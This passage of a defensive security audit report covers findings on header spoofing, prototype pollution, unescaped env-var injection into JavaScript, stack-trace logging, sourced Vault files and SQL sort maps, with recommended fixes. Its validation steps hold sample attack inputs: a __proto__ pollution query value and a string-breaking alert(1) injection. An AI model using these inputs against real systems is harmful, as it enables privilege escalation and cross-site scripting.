| **Lines** | 52, 80 |
| **Suspicious Code** | `const workerIp = req.headers['x-worker-ip']; ... getConfiguration(req['worker_id'], workerIp, ...)` |

**Why It's Dangerous:**
Any authenticated client (with a valid worker JWT) can set `x-worker-ip` to any value. If this IP is used for audit logging, routing decisions, or IP-based ACLs, an attacker can: spoof their location, attribute malicious activity to a legitimate worker, or bypass IP-based allow-lists.

**Severity / Priority:** MEDIUM — trust in a user-controlled header can corrupt audit trails and bypass IP-based controls.

**Safe Validation Approach:**
- Test: Send a request with worker JWT and `x-worker-ip: 127.0.0.1` — verify the value appears in logs attributed to this request, regardless of the actual source IP.

**Recommended Fix:**
```typescript
// Use actual remote IP — never trust X-Forwarded-For or custom headers from untrusted clients:
const workerIp = req.socket.remoteAddress ?? req.ip;
// If NAT traversal requires client-reported IP, validate against known worker CIDR ranges:
if (!isInAllowedWorkerCidr(req.headers['x-worker-ip'])) {
  this.logger.warn('x-worker-ip out of expected range; using socket IP');
}
```

---

### FIND-018
**🟡 MEDIUM — Unguarded JSON.parse → DoS + Prototype Pollution**

| Field | Detail |
|---|---|
| **Ingress** | `filter` query parameter on `GET /users` endpoint |
| **File** | `services/admin-service/src/user/user.controller.ts` |
| **Lines** | 101 |
| **Suspicious Code** | `JSON.parse(filter)` — no null guard, no try/catch |

**Why It's Dangerous:**
Unlike `project.controller.ts` (which has a null check), `user.controller.ts` calls `JSON.parse(filter)` unconditionally. `?filter=bad-json` throws an unhandled `SyntaxError` → HTTP 500 (DoS). `?filter={"__proto__":{"admin":true}}` may pollute `Object.prototype` when spread downstream.

**Severity / Priority:** MEDIUM — unauthenticated DoS vector; prototype pollution risk for authenticated users.

**Safe Validation Approach:**
- Test: `GET /api/v1/admin/users?filter=not-valid-json` — assert HTTP 400 response.

**Recommended Fix:** See FIND-012 — apply the same DTO + `ValidationPipe` pattern uniformly across all listing controllers.

---

### FIND-019
**🟡 MEDIUM — Env Vars Written to JS Without Escaping — Supply-Chain XSS Vector**

| Field | Detail |
|---|---|
| **Ingress** | All `VITE_*` environment variables injected into `/assets/env-config.js` via `generate_env.sh` |
| **File** | `services/datamigrator-ui/generate_env.sh` |
| **Lines** | 5–35 |
| **Suspicious Code** | `echo "  VITE_KEYCLOAK_HOST: \"${VITE_KEYCLOAK_HOST}\"," >> $CONFIG_FILE` (no value escaping, repeated for all vars) |

**Why It's Dangerous:**
All env vars are written inside double-quoted JavaScript string literals with **no escaping**. A value containing `"` or `\` breaks the JS string context. If an attacker can inject a value (compromised CI/CD pipeline, malicious Kubernetes ConfigMap, supply-chain attack), they can inject arbitrary JavaScript into `env-config.js` — loaded by every browser session.

**Severity / Priority:** MEDIUM — requires env var injection ability (supply-chain), but the impact is stored XSS for all users.

**Safe Validation Approach:**
- Test: Set `VITE_KEYCLOAK_HOST` to `test"; alert(1); //` during a container build and verify the resulting `env-config.js` does **not** contain executable JS.

**Recommended Fix:**
```bash
# Use Node.js JSON encoding to safely escape values:
VITE_KEYCLOAK_HOST_JSON=$(node -e "process.stdout.write(JSON.stringify(process.env.VITE_KEYCLOAK_HOST || ''))")
echo "  VITE_KEYCLOAK_HOST: ${VITE_KEYCLOAK_HOST_JSON}," >> $CONFIG_FILE
```
Also add `Content-Security-Policy` headers on the nginx serving this file.

---

### FIND-020
**🟡 MEDIUM — Full Stack Traces Logged in Auth Error Path**

| Field | Detail |
|---|---|
| **Ingress** | Error objects from failed JWT/token operations |
| **Files** | `services/jobs-service/src/auth/auth.service.ts:86`, `services/db-writer/src/auth/auth.service.ts:89`, `services/worker/src/auth/auth.service.ts:53` |
| **Lines** | 86, 89, 53 |
| **Suspicious Code** | `this.logger.error(\`... ${error.message}, stack: ${error.stack}\`)` |

**Why It's Dangerous:**
Full error stack traces logged at `ERROR` level may reveal: Keycloak URLs with embedded query parameters (potentially including credentials), internal service hostnames and port numbers, Node.js/library version fingerprints useful for targeting known CVEs, and sensitive request context.

**Severity / Priority:** MEDIUM — anyone with log aggregation access (SIEM, Elasticsearch) can map internal architecture.

**Recommended Fix:**
```typescript
// Production: log only message, never stack trace for auth errors
this.logger.error(`[AuthService]: Failed to obtain access token: ${error instanceof Error ? error.message : 'unknown error'}`);
// Debug level only in non-production:
if (process.env.NODE_ENV !== 'production') {
  this.logger.debug(`Stack: ${error instanceof Error ? error.stack : ''}`);
}
```

---

### FIND-021
**🔵 LOW — Vault .env Files Sourced as Shell Code**

| Field | Detail |
|---|---|
| **Ingress** | Vault secret `.env` files at `/vault/secrets/*.env` |
| **File** | `services/admin-service/entrypoint.sh` (and equivalent files in other services) |
| **Lines** | 9–12 |
| **Suspicious Code** | `for env_file in /vault/secrets/*.env; do ... source "$env_file"; done` |

**Why It's Dangerous:**
`source` executes the entire file as shell code. Any file in `/vault/secrets/` matching `*.env` is executed — not just parsed. If an attacker can write to `/vault/secrets/` (Vault agent sidecar misconfiguration, writable Kubernetes volume), they achieve arbitrary code execution in the container at startup. The `echo "Sourcing $env_file"` also logs secret file paths to stdout, potentially leaking path information.

**Severity / Priority:** LOW — requires privileged write access to `/vault/secrets/`.

**Recommended Fix:**
```bash
# Parse .env files safely without executing arbitrary code:
while IFS= read -r line; do
  if [[ "$line" =~ ^[A-Z_][A-Z0-9_]*=.* && ! "$line" =~ ^# ]]; then
    export "$line"
  fi
done < "$env_file"
```
Better: Use `vault-agent-injector` with `template` stanza to inject env vars directly — eliminating the need to source files.

---

### FIND-022
**🔵 LOW — SQL Column Map Maintenance Trap**

| Field | Detail |
|---|---|
| **Ingress** | `sort`, `order` query parameters on job run error API |
| **File** | `services/jobs-service/src/jobrun/jobrun.service.ts` |
| **Lines** | 873–930 |
| **Suspicious Code** | `SORTABLE_COLUMNS.includes(sort) ? { createdAt: 'oe.created_at', ... }[sort] : 'oe.created_at'` |

**Why It's Dangerous:**
Currently, the allowlist logic is correct. However, the `SORTABLE_COLUMNS` array and the column map object are **decoupled**. If a developer adds an entry to `SORTABLE_COLUMNS` without a corresponding entry in the column map, `sortColumn` becomes `undefined`, injecting the literal string `'undefined'` into the SQL `ORDER BY` clause — causing a SQL error that leaks table/column structure information in error messages.

**Severity / Priority:** LOW — not currently exploitable; risk introduced by future maintenance.

**Recommended Fix:**
```typescript
// Couple the allowlist to the map — they cannot diverge:
const COLUMN_MAP: Record<string, string> = {
  createdAt: 'oe.created_at',
  errorMessage: 'oe.error_message',
  // ...
};
const sortColumn = COLUMN_MAP[sort] ?? 'oe.created_at';
const SORTABLE_COLUMNS = Object.keys(COLUMN_MAP); // derived, not separate
```

---

### FIND-023
**🔵 LOW — UI Encryption Rendered Useless by FIND-003**

| Field | Detail |
|---|---|
| **Ingress** | Encrypted data in browser localStorage / memory |
| **File** | `services/datamigrator-ui/src/utils/common.utils.ts` |
| **Lines** | 148–175 |
| **Suspicious Code** | `decryptData` and `encryptData` derive key from `window?.env?.VITE_KEYCLOAK_CLIENT_SECRET` |

**Why It's Dangerous:**
Since the encryption key (`VITE_KEYCLOAK_CLIENT_SECRET`) is publicly accessible in `/assets/env-config.js` (FIND-003), and AES-256-CTR provides no message authentication (FIND-015), any UI-encrypted data can be trivially decrypted by anyone. This renders the entire client-side encryption scheme security-theater.

**Severity / Priority:** LOW (impact subsumed by FIND-003 which is CRITICAL).

**Recommended Fix:**
Remove all client-side encryption. If sensitive data must be stored client-side, use the Web Crypto API with a key derived from the **user's own password** (never a shared application secret) via PBKDF2 or HKDF, and use AES-256-GCM for authenticated encryption.

---

## 4. Areas Requiring Manual Review

The following areas could not be fully analyzed through static inspection and require manual or dynamic review:

| Area | Concern | Service(s) |
|---|---|---|
| **Temporal workflow payload deserialization** | Temporal uses MessagePack/JSON for workflow payloads. If `WorkflowExecutionInput` objects are deserialized with custom deserializers, prototype pollution or type confusion is possible. | jobs-service, support-service, worker |
| **Archive extraction (tar/zip)** | `upgrade.service` references archive extraction. Zip-slip attacks (path traversal via `../` in archive entries) need to be verified in the extraction logic. | worker |
| **Database ORM queries in db-writer** | The db-writer service was not fully audited for raw query usage. All `QueryRunner` / raw `query()` calls should be reviewed for string interpolation. | db-writer |
| **Keycloak JWKS endpoint SSRF** | Services fetch JWKS from a configured Keycloak URL. If the Keycloak URL can be influenced by user input or config, this is an SSRF vector. | ALL services |
| **Worker-to-Config-Service mTLS** | The trust model for worker JWTs should be verified — particularly whether token expiry, revocation, and scope restrictions are enforced correctly. | admin-service, config-service |
| **Redis data model** | Redis stores job contexts and migration states. If any stored value is later used in a shell command or DB query without re-validation, stored data becomes a second-order injection vector. | worker, jobs-service |
| **Keycloak customizations** | `services/keycloak-customizations/` was not fully inspected. Custom authentication SPIs and theme files may contain injection vectors. | keycloak-customizations |
| **scripts/live-source-scripts** | Shell scripts in `scripts/live-source-scripts/` interact with live environments and may contain unsafe patterns. | scripts |

---

## 5. Top 3 Immediate Actions

| Priority | Action | Finding(s) |
|---|---|---|
| **1** | **Rotate the Keycloak client secret immediately** — it has been exposed in a public static file. Switch to PKCE Authorization Code flow and remove `VITE_KEYCLOAK_CLIENT_SECRET` from `generate_env.sh` entirely. | FIND-003 |
| **2** | **Replace all `execAsync(interpolated_string)` calls with `execFileAsync` + argument arrays** in `mount-tracker.service.ts`, `isilon-storage-client.ts`, `win-operation.service.ts`, `linux-binary.handler.ts`, and `log-generator.activity.ts`. | FIND-001, 002, 004, 005, 006, 011 |
| **3** | **Remove the `/auth/secrets/redis` endpoint** and deliver Redis credentials via Kubernetes Secrets or Vault instead. Remove all hardcoded `|| 'admin'` credential fallbacks and add startup validation. | FIND-008, FIND-009 |
